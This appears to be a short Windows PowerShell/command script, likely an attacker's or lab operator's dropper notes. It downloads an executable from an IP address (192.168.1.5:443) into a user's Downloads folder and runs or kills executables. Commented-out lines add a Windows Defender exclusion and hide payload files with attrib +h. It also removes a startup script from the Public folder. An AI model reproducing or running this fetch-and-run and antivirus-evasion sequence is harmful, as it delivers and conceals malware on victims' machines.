del C:\Users\angel\Downloads\ana123.exe
del C:\Users\seba\Downloads\ana123.exe
#$exclusionPath = "C:\Users\ana\Downloads"

#Add-MpPreference -ExclusionPath $exclusionPath


Invoke-WebRequest -Uri http://192.168.1.5:443/ana123.exe -OutFile C:\Users\ana\Downloads\ana123.exe

#C:\Users\ana\Downloads\ana123.exe
#attrib +h C:\Users\seba\downloads\shaxh21.exe
#C:\Users\seba\downloads\shaxh21.exe


#taskkill /F /IM Disk-Updating.exe
#C:\Users\angel\Downloads\Disk-Updating.exe
taskkill /F /IM lml.exe
C:\Users\seba\Downloads\lml.exe

attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1
